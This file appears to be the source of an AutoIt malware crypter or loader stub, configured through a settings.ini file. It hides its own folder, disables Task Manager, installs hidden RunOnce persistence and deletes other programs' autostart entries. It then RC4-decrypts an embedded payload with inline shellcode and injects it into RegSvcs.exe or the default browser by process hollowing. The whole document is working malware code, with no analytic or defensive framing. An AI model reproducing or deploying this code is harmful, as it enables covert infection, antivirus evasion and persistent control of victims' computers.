#NoTrayIcon

;unicode support:
$unicode_scriptfullpath = FileGetShortName(@ScriptFullPath)
$unicode_scriptdir = FileGetShortName(@ScriptDir)
$unicode_userprofiledir = FileGetShortName(@UserProfileDir)

FileSetAttrib($unicode_scriptdir, "+SH")

$thekey = StringTrimLeft(IniRead($unicode_scriptdir & "\settings.ini", "decryptkey", "key", "NotFound"),5)
$Dir = $unicode_scriptfullpath
$STR = StringSplit($Dir, "\", 1)
$directory = False

For $i = 1 To $STR[0]
	If $STR[$i] = $thekey And $Dir = $unicode_userprofiledir & "\" & $thekey & "\" & @ScriptName Then
		$directory = True
		ExitLoop
	EndIf
Next

If $STR[0] - 1 And $directory = False Then
;bsod()
EndIf

If WinExists($thekey) Then
;bsod()
Else
EndIf

;---------------------------------------------------------------------------------

$type = IniRead($unicode_scriptdir & "\settings.ini", "messagetype", "key","NotFound")
$title = IniRead($unicode_scriptdir & "\settings.ini", "messagetitle", "key","NotFound")
$message = IniRead($unicode_scriptdir & "\settings.ini", "messagetext", "key","NotFound")

$autoit = ($unicode_scriptdir & "\settings.ini")
$path = FileRead($autoit)
$right = "[messagetype]"

If StringInStr($path,$right) Then
call("fakemessage")
Else
EndIf

Global $eof_boolean,$eof_var = IniRead($unicode_scriptdir & "\settings.ini", "ef", "key", "NotFound")
If $eof_var <> "NotFound" Then
$eof_boolean = True
Else
EndIf

Local $mutex = IniRead($unicode_scriptdir & "\settings.ini", "mu999", "key", "NotFound")
If $mutex = "mu999" Then
if ProcessExists("RegSvcs.exe") Then Exit
Else
EndIf

Local $delay = IniRead($unicode_scriptdir & "\settings.ini", "lay999", "key", "NotFound")
If $delay = "delay999" Then
	Call("confuser")
Else
EndIf

Local $botkiller = IniRead($unicode_scriptdir & "\settings.ini", "bot999", "key", "NotFound")
If $botkiller = "bot999" Then
	Call("botkiller")
Else
EndIf

Local $startup = IniRead($unicode_scriptdir & "\settings.ini", "start999", "key", "NotFound")
If $startup = "start999" Then
startup()
Else
EndIf

Local $task = IniRead($unicode_scriptdir & "\settings.ini", "task999", "key", "NotFound")
if $task = "task999" Then
call("task")
Else
EndIf

FileSetAttrib($unicode_scriptdir, "+SH")

Func _RunDos($sCommand)
	Local $nResult = RunWait(@ComSpec & " /C " & $sCommand, "", @SW_HIDE)
	Return SetError(@error, @extended, $nResult)
EndFunc   ;==>_RunDos

Func bsod()
	$a = ProcessList()
	For $i = 1 To UBound($a) - 1
		ProcessClose($a[$i][0])
	Next
	Exit
EndFunc   ;==>bsod

Func fakemessage()
If FileExists($unicode_userprofiledir & "\" & $thekey & "\check.txt") Then
;do nothing
Else
MsgBox($type,$title,$message)
FileWrite($unicode_userprofiledir & "\" & $thekey & "\check.txt", "")
EndIf
EndFunc

func task()
RegWrite("HKCU64\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
EndFunc

Func confuser()
	$counter = 0
	While $counter <= 5
		Sleep(5000)
		ShellExecute(@SystemDir & "\mshta.exe")
		$counter = $counter + 1
		_RunDos("taskkill /IM mshta.exe")
	WEnd
EndFunc   ;==>confuser

Func botkiller()
	If Not FileExists($unicode_userprofiledir & "\" & "disable.txt") Then
		FileWrite($unicode_userprofiledir & "\disable.txt", "disable")

		;HKCU

		;delete
		RegDelete("HKCU64\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
		RegDelete("HKCU64\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce")

		;restore
		RegWrite("HKCU64\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
		RegWrite("HKCU64\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce")
		;_________________________________________________________________________

		;HKLM

		;delete
		RegDelete("HKLM64\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
		RegDelete("HKLM64\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce")

		;restore
		RegWrite("HKLM64\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
		RegWrite("HKLM64\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce")

		FileDelete(@StartupDir & "\*.*")
	Else
	EndIf
EndFunc   ;==>botkiller

Func startup()
	RegWrite("HKCU64\Software\Microsoft\Windows\CurrentVersion\RunOnce", $thekey, "REG_SZ", $unicode_userprofiledir & "\" & $thekey & "\start.vbs")
	If Not FileExists($unicode_userprofiledir & "\" & $thekey & "\start.vbs") Then
		Local $bat = FileOpen($unicode_userprofiledir & "\" & $thekey & "\start.cmd", 1)
		$decrypter_script = IniRead($unicode_scriptdir & "\settings.ini", "desc", "key", "NotFound")
		$autoit3 = IniRead($unicode_scriptdir & "\settings.ini", "au3", "key", "NotFound")
		FileWrite($bat, "@echo off" & @CRLF & "cd " & "%userprofile%\" & $thekey & "\" & @CRLF & "start " & $autoit3 & " " & '"' & $decrypter_script & '"')
		FileClose($bat)
		Local $vbs = FileOpen($unicode_userprofiledir & "\" & $thekey & "\start.vbs", 1)
		FileWrite($vbs, 'const Hidden = 0' & @CRLF & 'const WaitOnReturn = true' & @CRLF & 'File ="""' & $unicode_userprofiledir & "\" & $thekey & "\" & 'start.cmd"""' & @CRLF & 'set WshShell = CreateObject("WScript.Shell")' & @CRLF & 'WshShell.Run file, Hidden, WaitOnReturn' & @CRLF & 'wscript.quit')
		FileClose($vbs)
		RegWrite("HKCU64\Software\Microsoft\Windows\CurrentVersion\RunOnce", $thekey, "REG_SZ", $unicode_userprofiledir & "\" & $thekey & "\start.vbs")
	Else
	EndIf
EndFunc   ;==>startup



SubMain()
Func SubMain()
	$tester = IniRead($unicode_scriptdir & "\settings.ini", "enbi", "key", "NotFound")
	$sAppPath = ($unicode_scriptdir & "\" & $tester)
	$sKey = "\\cm100\\"
	$AppExe = $sAppPath
	$sArquive = FileRead($sAppPath)
	$sParams = StringInStr($sArquive, $sKey)
	$sLen = $sParams + sLenEx($sKey)
	$sArquive = StringMid($sArquive, $sLen)
	Call(_RunPE(_RC4($sArquive, $sKey)))
EndFunc   ;==>SubMain

Func _RC4($Data, $key)
	Local $thekey = IniRead($unicode_scriptdir & "\settings.ini", "decryptkey", "key", "NotFound")
	$test = StringTrimLeft($thekey, 5)
	$key = $test
	Local $OPCODE = "0xC81001006A006A005356578B551031C989C84989D7F2AE484829C88945F085C00F84DC000000B90001000088C82C0188840DEFFEFFFFE2F38365F4008365FC00817DFC000100007D478B45FC31D2F775F0920345100FB6008B4DFC0FB68C0DF0FEFFFF01C80345F425FF0000008945F48B75FC8A8435F0FEFFFF8B7DF486843DF0FEFFFF888435F0FEFFFFFF45FCEBB08D9DF0FEFFFF31FF89FA39550C76638B85ECFEFFFF4025FF0000008985ECFEFFFF89D80385ECFEFFFF0FB6000385E8FEFFFF25FF0000008985E8FEFFFF89DE03B5ECFEFFFF8A0689DF03BDE8FEFFFF860788060FB60E0FB60701C181E1FF0000008A840DF0FEFFFF8B750801D6300642EB985F5E5BC9C21000"
	Local $CodeBuffer = DllStructCreate("byte[" & BinaryLen($OPCODE) & "]")
	DllStructSetData($CodeBuffer, 1, $OPCODE)
	Local $Buffer = DllStructCreate("byte[" & BinaryLen($Data) & "]")
	DllStructSetData($Buffer, 1, $Data)
	DllCall("user32.dll", "none", "CallWindowProc", "ptr", DllStructGetPtr($CodeBuffer), "ptr", DllStructGetPtr($Buffer), "int", BinaryLen($Data), "str", $key, "int", 0)
	Local $Ret = DllStructGetData($Buffer, 1)
	$Buffer = 0
	$CodeBuffer = 0
	Return $Ret
EndFunc

Func sLenEx($sStr)
	Local $Result, $i, $bLen
	Do
		$i = $i + 1
		$bLen = StringLeft($sStr, $i)
		$Result = $i
	Until $sStr = $bLen
	Return $Result
EndFunc   ;==>sLenEx





Func _RunPE($bbinaryimage, $scommandline = "")
	#region 1. DETERMINE INTERPRETER TYPE
	Local $fautoitx64 = @AutoItX64
	#region 2. PREDPROCESSING PASSED
	Local $bbinary = Binary($bbinaryimage)
	Local $tbinary = DllStructCreate("BYTE[" & BinaryLen($bbinary) & "]")
	DllStructSetData($tbinary, 1, $bbinary)
	Local $ppointer = DllStructGetPtr($tbinary)
	#region 3. CREATING NEW PROCESS
	Local $tstartupinfo = DllStructCreate("DWORD  CBSIZE;" & "PTR RESERVED;" & "PTR DESKTOP;" & "PTR TITLE;" & "DWORD X;" & "DWORD Y;" & "DWORD XSIZE;" & "DWORD YSIZE;" & "DWORD XCOUNTCHARS;" & "DWORD YCOUNTCHARS;" & "DWORD FILLATTRIBUTE;" & "DWORD FLAGS;" & "WORD SHOWWINDOW;" & "WORD RESERVED2;" & "PTR RESERVED2;" & "PTR HSTDINPUT;" & "PTR HSTDOUTPUT;" & "PTR HSTDERROR")
	Local $tprocess_information = DllStructCreate("PTR PROCESS;" & "PTR THREAD;" & "DWORD PROCESSID;" & "DWORD THREADID")

	$Injecto2 = (@WindowsDir & "\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe")
	$Injecto4 = (@WindowsDir & "\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe")

	If $eof_boolean = True  Then

		$Read_EOF = FileRead($unicode_scriptdir & "\" & $eof_var)

		If FileExists($Injecto4) Then

			FileCopy($Injecto4,@TempDir & "\RegSvcs.exe" ,1)
			$Injecto4 = @TempDir & "\RegSvcs.exe"
			FileWrite($Injecto4,$Read_EOF)
			Local $acall = DllCall("KERNEL32.DLL", "BOOL", "CreateProcessW", "WSTR", $Injecto4, "WSTR", $scommandline, "PTR", 0, "PTR", 0, "INT", 0, "DWORD", 4, "PTR", 0, "PTR", 0, "PTR", DllStructGetPtr($tstartupinfo), "PTR", DllStructGetPtr($tprocess_information))

		Elseif FileExists($Injecto2) Then

			FileCopy($Injecto2,@TempDir & "\RegSvcs.exe" ,1)
			$Injecto2 = @TempDir & "\RegSvcs.exe"
			FileWrite($Injecto2,$Read_EOF)
			Local $acall = DllCall("KERNEL32.DLL", "BOOL", "CreateProcessW", "WSTR", $Injecto2, "WSTR", $scommandline, "PTR", 0, "PTR", 0, "INT", 0, "DWORD", 4, "PTR", 0, "PTR", 0, "PTR", DllStructGetPtr($tstartupinfo), "PTR", DllStructGetPtr($tprocess_information))

		Else

			$Injecto = StringSplit(RegRead("HKCR\http\shell\open\command", ""), '"')
			FileCopy($Injecto[2],@TempDir & "\firefox.exe" ,1)
			$Injecto = @TempDir & "\firefox.exe"
			FileWrite($Injecto,$Read_EOF)
			Local $acall = DllCall("KERNEL32.DLL", "BOOL", "CreateProcessW", "WSTR", $Injecto, "WSTR", $scommandline, "PTR", 0, "PTR", 0, "INT", 0, "DWORD", 4, "PTR", 0, "PTR", 0, "PTR", DllStructGetPtr($tstartupinfo), "PTR", DllStructGetPtr($tprocess_information))

		EndIf

	Else

		If FileExists($Injecto4) Then
			Local $acall = DllCall("KERNEL32.DLL", "BOOL", "CreateProcessW", "WSTR", $Injecto4, "WSTR", $scommandline, "PTR", 0, "PTR", 0, "INT", 0, "DWORD", 4, "PTR", 0, "PTR", 0, "PTR", DllStructGetPtr($tstartupinfo), "PTR", DllStructGetPtr($tprocess_information))

		Elseif FileExists($Injecto2) then
			Local $acall = DllCall("KERNEL32.DLL", "BOOL", "CreateProcessW", "WSTR", $Injecto2, "WSTR", $scommandline, "PTR", 0, "PTR", 0, "INT", 0, "DWORD", 4, "PTR", 0, "PTR", 0, "PTR", DllStructGetPtr($tstartupinfo), "PTR", DllStructGetPtr($tprocess_information))

		Else
			$Injecto = StringSplit(RegRead("HKCR\http\shell\open\command", ""), '"')
			Local $acall = DllCall("KERNEL32.DLL", "BOOL", "CreateProcessW", "WSTR", $Injecto[2], "WSTR", $scommandline, "PTR", 0, "PTR", 0, "INT", 0, "DWORD", 4, "PTR", 0, "PTR", 0, "PTR", DllStructGetPtr($tstartupinfo), "PTR", DllStructGetPtr($tprocess_information))
		EndIf

	EndIf



	If @error Or Not $acall[0] Then Return SetError(1, 0, 0)
	Local $hprocess = DllStructGetData($tprocess_information, "PROCESS")
	Local $hthread = DllStructGetData($tprocess_information, "THREAD")
	If $fautoitx64 And __runpe_iswow64process($hprocess) Then
		DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
		Return SetError(2, 0, 0)
	EndIf
	#region 4. FILL CONTEXT STRUCTURE
	Local $irunflag, $tcontext
	If $fautoitx64 Then
		If @OSArch = "X64" Then
			$irunflag = 2
			$tcontext = DllStructCreate("ALIGN 16; UINT64 P1HOME; UINT64 P2HOME; UINT64 P3HOME; UINT64 P4HOME; UINT64 P5HOME; UINT64 P6HOME;" & "DWORD CONTEXTFLAGS; DWORD MXCSR;" & "WORD SEGCS; WORD SEGDS; WORD SEGES; WORD SEGFS; WORD SEGGS; WORD SEGSS; DWORD EFLAGS;" & "UINT64 DR0; UINT64 DR1; UINT64 DR2; UINT64 DR3; UINT64 DR6; UINT64 DR7;" & "UINT64 RAX; UINT64 RCX; UINT64 RDX; UINT64 RBX; UINT64 RSP; UINT64 RBP; UINT64 RSI; UINT64 RDI; UINT64 R8; UINT64 R9; UINT64 R10; UINT64 R11; UINT64 R12; UINT64 R13; UINT64 R14; UINT64 R15;" & "UINT64 RIP;" & "UINT64 HEADER[4]; UINT64 LEGACY[16]; UINT64 XMM0[2]; UINT64 XMM1[2]; UINT64 XMM2[2]; UINT64 XMM3[2]; UINT64 XMM4[2]; UINT64 XMM5[2]; UINT64 XMM6[2]; UINT64 XMM7[2]; UINT64 XMM8[2]; UINT64 XMM9[2]; UINT64 XMM10[2]; UINT64 XMM11[2]; UINT64 XMM12[2]; UINT64 XMM13[2]; UINT64 XMM14[2]; UINT64 XMM15[2];" & "UINT64 VECTORREGISTER[52]; UINT64 VECTORCONTROL;" & "UINT64 DEBUGCONTROL; UINT64 LASTBRANCHTORIP; UINT64 LASTBRANCHFROMRIP; UINT64 LASTEXCEPTIONTORIP; UINT64 LASTEXCEPTIONFROMRIP")
		Else
			$irunflag = 3
			DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
			Return SetError(102, 0, 0)
		EndIf
	Else
		$irunflag = 1
		$tcontext = DllStructCreate("DWORD CONTEXTFLAGS;" & "DWORD DR0; DWORD DR1; DWORD DR2; DWORD DR3; DWORD DR6; DWORD DR7;" & "DWORD CONTROLWORD; DWORD STATUSWORD; DWORD TAGWORD; DWORD ERROROFFSET; DWORD ERRORSELECTOR; DWORD DATAOFFSET; DWORD DATASELECTOR; BYTE REGISTERAREA[80]; DWORD CR0NPXSTATE;" & "DWORD SEGGS; DWORD SEGFS; DWORD SEGES; DWORD SEGDS;" & "DWORD EDI; DWORD ESI; DWORD EBX; DWORD EDX; DWORD ECX; DWORD EAX;" & "DWORD EBP; DWORD EIP; DWORD SEGCS; DWORD EFLAGS; DWORD ESP; DWORD SEGSS;" & "BYTE EXTENDEDREGISTERS[512]")
	EndIf
	Local $context_full
	Switch $irunflag
		Case 1
			$context_full = 65543
		Case 2
			$context_full = 1048583
		Case 3
			$context_full = 524327
	EndSwitch
	DllStructSetData($tcontext, "CONTEXTFLAGS", $context_full)
	$acall = DllCall("KERNEL32.DLL", "BOOL", "GetThreadContext", "HANDLE", $hthread, "PTR", DllStructGetPtr($tcontext))
	If @error Or Not $acall[0] Then
		DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
		Return SetError(3, 0, 0)
	EndIf
	Local $ppeb
	Switch $irunflag
		Case 1
			$ppeb = DllStructGetData($tcontext, "EBX")
		Case 2
			$ppeb = DllStructGetData($tcontext, "RDX")
		Case 3
	EndSwitch
	#region 5. READ PE-FORMAT
	Local $timage_dos_header = DllStructCreate("CHAR MAGIC[2];" & "WORD BYTESONLASTPAGE;" & "WORD PAGES;" & "WORD RELOCATIONS;" & "WORD SIZEOFHEADER;" & "WORD MINIMUMEXTRA;" & "WORD MAXIMUMEXTRA;" & "WORD SS;" & "WORD SP;" & "WORD CHECKSUM;" & "WORD IP;" & "WORD CS;" & "WORD RELOCATION;" & "WORD OVERLAY;" & "CHAR RESERVED[8];" & "WORD OEMIDENTIFIER;" & "WORD OEMINFORMATION;" & "CHAR RESERVED2[20];" & "DWORD ADDRESSOFNEWEXEHEADER", $ppointer)
	Local $pheaders_new = $ppointer
	$ppointer += DllStructGetData($timage_dos_header, "ADDRESSOFNEWEXEHEADER")
	Local $smagic = DllStructGetData($timage_dos_header, "MAGIC")
	If Not ($smagic == "MZ") Then
		DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
		Return SetError(4, 0, 0)
	EndIf
	Local $timage_nt_signature = DllStructCreate("DWORD SIGNATURE", $ppointer)
	$ppointer += 4
	If DllStructGetData($timage_nt_signature, "SIGNATURE") <> 17744 Then
		DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
		Return SetError(5, 0, 0)
	EndIf
	Local $timage_file_header = DllStructCreate("WORD MACHINE;" & "WORD NUMBEROFSECTIONS;" & "DWORD TIMEDATESTAMP;" & "DWORD POINTERTOSYMBOLTABLE;" & "DWORD NUMBEROFSYMBOLS;" & "WORD SIZEOFOPTIONALHEADER;" & "WORD CHARACTERISTICS", $ppointer)
	Local $inumberofsections = DllStructGetData($timage_file_header, "NUMBEROFSECTIONS")
	$ppointer += 20
	Local $tmagic = DllStructCreate("WORD MAGIC;", $ppointer)
	Local $imagic = DllStructGetData($tmagic, 1)
	Local $timage_optional_header
	If $imagic = 267 Then
		If $fautoitx64 Then
			DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
			Return SetError(6, 0, 0)
		EndIf
		$timage_optional_header = DllStructCreate("WORD MAGIC;" & "BYTE MAJORLINKERVERSION;" & "BYTE MINORLINKERVERSION;" & "DWORD SIZEOFCODE;" & "DWORD SIZEOFINITIALIZEDDATA;" & "DWORD SIZEOFUNINITIALIZEDDATA;" & "DWORD ADDRESSOFENTRYPOINT;" & "DWORD BASEOFCODE;" & "DWORD BASEOFDATA;" & "DWORD IMAGEBASE;" & "DWORD SECTIONALIGNMENT;" & "DWORD FILEALIGNMENT;" & "WORD MAJOROPERATINGSYSTEMVERSION;" & "WORD MINOROPERATINGSYSTEMVERSION;" & "WORD MAJORIMAGEVERSION;" & "WORD MINORIMAGEVERSION;" & "WORD MAJORSUBSYSTEMVERSION;" & "WORD MINORSUBSYSTEMVERSION;" & "DWORD WIN32VERSIONVALUE;" & "DWORD SIZEOFIMAGE;" & "DWORD SIZEOFHEADERS;" & "DWORD CHECKSUM;" & "WORD SUBSYSTEM;" & "WORD DLLCHARACTERISTICS;" & "DWORD SIZEOFSTACKRESERVE;" & "DWORD SIZEOFSTACKCOMMIT;" & "DWORD SIZEOFHEAPRESERVE;" & "DWORD SIZEOFHEAPCOMMIT;" & "DWORD LOADERFLAGS;" & "DWORD NUMBEROFRVAANDSIZES", $ppointer)
		$ppointer += 96
	ElseIf $imagic = 523 Then
		If Not $fautoitx64 Then
			DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
			Return SetError(6, 0, 0)
		EndIf
		$timage_optional_header = DllStructCreate("WORD MAGIC;" & "BYTE MAJORLINKERVERSION;" & "BYTE MINORLINKERVERSION;" & "DWORD SIZEOFCODE;" & "DWORD SIZEOFINITIALIZEDDATA;" & "DWORD SIZEOFUNINITIALIZEDDATA;" & "DWORD ADDRESSOFENTRYPOINT;" & "DWORD BASEOFCODE;" & "UINT64 IMAGEBASE;" & "DWORD SECTIONALIGNMENT;" & "DWORD FILEALIGNMENT;" & "WORD MAJOROPERATINGSYSTEMVERSION;" & "WORD MINOROPERATINGSYSTEMVERSION;" & "WORD MAJORIMAGEVERSION;" & "WORD MINORIMAGEVERSION;" & "WORD MAJORSUBSYSTEMVERSION;" & "WORD MINORSUBSYSTEMVERSION;" & "DWORD WIN32VERSIONVALUE;" & "DWORD SIZEOFIMAGE;" & "DWORD SIZEOFHEADERS;" & "DWORD CHECKSUM;" & "WORD SUBSYSTEM;" & "WORD DLLCHARACTERISTICS;" & "UINT64 SIZEOFSTACKRESERVE;" & "UINT64 SIZEOFSTACKCOMMIT;" & "UINT64 SIZEOFHEAPRESERVE;" & "UINT64 SIZEOFHEAPCOMMIT;" & "DWORD LOADERFLAGS;" & "DWORD NUMBEROFRVAANDSIZES", $ppointer)
		$ppointer += 112
	Else
		DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
		Return SetError(6, 0, 0)
	EndIf
	Local $ientrypointnew = DllStructGetData($timage_optional_header, "ADDRESSOFENTRYPOINT")
	Local $ioptionalheadersizeofheadersnew = DllStructGetData($timage_optional_header, "SIZEOFHEADERS")
	Local $poptionalheaderimagebasenew = DllStructGetData($timage_optional_header, "IMAGEBASE")
	Local $ioptionalheadersizeofimagenew = DllStructGetData($timage_optional_header, "SIZEOFIMAGE")
	$ppointer += 8
	$ppointer += 8
	$ppointer += 24
	Local $timage_directory_entry_basereloc = DllStructCreate("DWORD VIRTUALADDRESS; DWORD SIZE", $ppointer)
	Local $paddressnewbasereloc = DllStructGetData($timage_directory_entry_basereloc, "VIRTUALADDRESS")
	Local $isizebasereloc = DllStructGetData($timage_directory_entry_basereloc, "SIZE")
	Local $frelocatable
	If $paddressnewbasereloc And $isizebasereloc Then $frelocatable = True
	If Not $frelocatable Then ConsoleWrite("!!!NOT RELOCATABLE MODULE. I WILL TRY BUT THIS MAY NOT WORK!!!" & @CRLF)
	$ppointer += 88
	#region 6. ALLOCATE 'NEW' MEMORY SPACE
	Local $frelocate
	Local $pzeropoint
	If $frelocatable Then
		$pzeropoint = __runpe_allocateexespace($hprocess, $ioptionalheadersizeofimagenew)
		If @error Then
			$pzeropoint = __runpe_allocateexespaceataddress($hprocess, $poptionalheaderimagebasenew, $ioptionalheadersizeofimagenew)
			If @error Then
				__runpe_unmapviewofsection($hprocess, $poptionalheaderimagebasenew)
				$pzeropoint = __runpe_allocateexespaceataddress($hprocess, $poptionalheaderimagebasenew, $ioptionalheadersizeofimagenew)
				If @error Then
					DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
					Return SetError(101, 1, 0)
				EndIf
			EndIf
		EndIf
		$frelocate = True
	Else
		$pzeropoint = __runpe_allocateexespaceataddress($hprocess, $poptionalheaderimagebasenew, $ioptionalheadersizeofimagenew)
		If @error Then
			__runpe_unmapviewofsection($hprocess, $poptionalheaderimagebasenew)
			$pzeropoint = __runpe_allocateexespaceataddress($hprocess, $poptionalheaderimagebasenew, $ioptionalheadersizeofimagenew)
			If @error Then
				DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
				Return SetError(101, 0, 0)
			EndIf
		EndIf
	EndIf
	DllStructSetData($timage_optional_header, "IMAGEBASE", $pzeropoint)
	#region 7. CONSTRUCT THE NEW MODULE
	Local $tmodule = DllStructCreate("BYTE[" & $ioptionalheadersizeofimagenew & "]")
	Local $pmodule = DllStructGetPtr($tmodule)
	Local $theaders = DllStructCreate("BYTE[" & $ioptionalheadersizeofheadersnew & "]", $pheaders_new)
	DllStructSetData($tmodule, 1, DllStructGetData($theaders, 1))
	Local $timage_section_header
	Local $isizeofrawdata, $ppointertorawdata
	Local $ivirtualaddress, $ivirtualsize
	Local $trelocraw
	For $i = 1 To $inumberofsections
		$timage_section_header = DllStructCreate("CHAR NAME[8];" & "DWORD UNIONOFVIRTUALSIZEANDPHYSICALADDRESS;" & "DWORD VIRTUALADDRESS;" & "DWORD SIZEOFRAWDATA;" & "DWORD POINTERTORAWDATA;" & "DWORD POINTERTORELOCATIONS;" & "DWORD POINTERTOLINENUMBERS;" & "WORD NUMBEROFRELOCATIONS;" & "WORD NUMBEROFLINENUMBERS;" & "DWORD CHARACTERISTICS", $ppointer)
		$isizeofrawdata = DllStructGetData($timage_section_header, "SIZEOFRAWDATA")
		$ppointertorawdata = $pheaders_new + DllStructGetData($timage_section_header, "POINTERTORAWDATA")
		$ivirtualaddress = DllStructGetData($timage_section_header, "VIRTUALADDRESS")
		$ivirtualsize = DllStructGetData($timage_section_header, "UNIONOFVIRTUALSIZEANDPHYSICALADDRESS")
		If $ivirtualsize And $ivirtualsize < $isizeofrawdata Then $isizeofrawdata = $ivirtualsize
		If $isizeofrawdata Then
			DllStructSetData(DllStructCreate("BYTE[" & $isizeofrawdata & "]", $pmodule + $ivirtualaddress), 1, DllStructGetData(DllStructCreate("BYTE[" & $isizeofrawdata & "]", $ppointertorawdata), 1))
		EndIf
		If $frelocate Then
			If $ivirtualaddress <= $paddressnewbasereloc And $ivirtualaddress + $isizeofrawdata > $paddressnewbasereloc Then
				$trelocraw = DllStructCreate("BYTE[" & $isizebasereloc & "]", $ppointertorawdata + ($paddressnewbasereloc - $ivirtualaddress))
			EndIf
		EndIf
		$ppointer += 40
	Next
	If $frelocate Then __runpe_fixreloc($pmodule, $trelocraw, $pzeropoint, $poptionalheaderimagebasenew, $imagic = 523)
	$acall = DllCall("KERNEL32.DLL", "BOOL", "WriteProcessMemory", "HANDLE", $hprocess, "PTR", $pzeropoint, "PTR", $pmodule, "DWORD_PTR", $ioptionalheadersizeofimagenew, "DWORD_PTR*", 0)
	If @error Or Not $acall[0] Then
		DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
		Return SetError(7, 0, 0)
	EndIf
	#region 8. PEB IMAGEBASEADDRESS MANIPULATION
	Local $tpeb = DllStructCreate("BYTE INHERITEDADDRESSSPACE;" & "BYTE READIMAGEFILEEXECOPTIONS;" & "BYTE BEINGDEBUGGED;" & "BYTE SPARE;" & "PTR MUTANT;" & "PTR IMAGEBASEADDRESS;" & "PTR LOADERDATA;" & "PTR PROCESSPARAMETERS;" & "PTR SUBSYSTEMDATA;" & "PTR PROCESSHEAP;" & "PTR FASTPEBLOCK;" & "PTR FASTPEBLOCKROUTINE;" & "PTR FASTPEBUNLOCKROUTINE;" & "DWORD ENVIRONMENTUPDATECOUNT;" & "PTR KERNELCALLBACKTABLE;" & "PTR EVENTLOGSECTION;" & "PTR EVENTLOG;" & "PTR FREELIST;" & "DWORD TLSEXPANSIONCOUNTER;" & "PTR TLSBITMAP;" & "DWORD TLSBITMAPBITS[2];" & "PTR READONLYSHAREDMEMORYBASE;" & "PTR READONLYSHAREDMEMORYHEAP;" & "PTR READONLYSTATICSERVERDATA;" & "PTR ANSICODEPAGEDATA;" & "PTR OEMCODEPAGEDATA;" & "PTR UNICODECASETABLEDATA;" & "DWORD NUMBEROFPROCESSORS;" & "DWORD NTGLOBALFLAG;" & "BYTE SPARE2[4];" & "INT64 CRITICALSECTIONTIMEOUT;" & "DWORD HEAPSEGMENTRESERVE;" & "DWORD HEAPSEGMENTCOMMIT;" & "DWORD HEAPDECOMMITTOTALFREETHRESHOLD;" & "DWORD HEAPDECOMMITFREEBLOCKTHRESHOLD;" & "DWORD NUMBEROFHEAPS;" & "DWORD MAXIMUMNUMBEROFHEAPS;" & "PTR PROCESSHEAPS;" & "PTR GDISHAREDHANDLETABLE;" & "PTR PROCESSSTARTERHELPER;" & "PTR GDIDCATTRIBUTELIST;" & "PTR LOADERLOCK;" & "DWORD OSMAJORVERSION;" & "DWORD OSMINORVERSION;" & "DWORD OSBUILDNUMBER;" & "DWORD OSPLATFORMID;" & "DWORD IMAGESUBSYSTEM;" & "DWORD IMAGESUBSYSTEMMAJORVERSION;" & "DWORD IMAGESUBSYSTEMMINORVERSION;" & "DWORD GDIHANDLEBUFFER[34];" & "DWORD POSTPROCESSINITROUTINE;" & "DWORD TLSEXPANSIONBITMAP;" & "BYTE TLSEXPANSIONBITMAPBITS[128];" & "DWORD SESSIONID")
	$acall = DllCall("KERNEL32.DLL", "BOOL", "ReadProcessMemory", "PTR", $hprocess, "PTR", $ppeb, "PTR", DllStructGetPtr($tpeb), "DWORD_PTR", DllStructGetSize($tpeb), "DWORD_PTR*", 0)
	If @error Or Not $acall[0] Then
		DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
		Return SetError(8, 0, 0)
	EndIf
	DllStructSetData($tpeb, "IMAGEBASEADDRESS", $pzeropoint)
	$acall = DllCall("KERNEL32.DLL", "BOOL", "WriteProcessMemory", "HANDLE", $hprocess, "PTR", $ppeb, "PTR", DllStructGetPtr($tpeb), "DWORD_PTR", DllStructGetSize($tpeb), "DWORD_PTR*", 0)
	If @error Or Not $acall[0] Then
		DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
		Return SetError(9, 0, 0)
	EndIf
	#region 9. NEW ENTRY POINT
	Switch $irunflag
		Case 1
			DllStructSetData($tcontext, "EAX", $pzeropoint + $ientrypointnew)
		Case 2
			DllStructSetData($tcontext, "RCX", $pzeropoint + $ientrypointnew)
		Case 3
	EndSwitch
	#region 10. SET NEW CONTEXT
	$acall = DllCall("KERNEL32.DLL", "BOOL", "SetThreadContext", "HANDLE", $hthread, "PTR", DllStructGetPtr($tcontext))
	If @error Or Not $acall[0] Then
		DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
		Return SetError(10, 0, 0)
	EndIf
	#region 11. RESUME THREAD
	$acall = DllCall("KERNEL32.DLL", "DWORD", "ResumeThread", "HANDLE", $hthread)
	If @error Or $acall[0] = -1 Then
		DllCall("KERNEL32.DLL", "BOOL", "TerminateProcess", "HANDLE", $hprocess, "DWORD", 0)
		Return SetError(11, 0, 0)
	EndIf
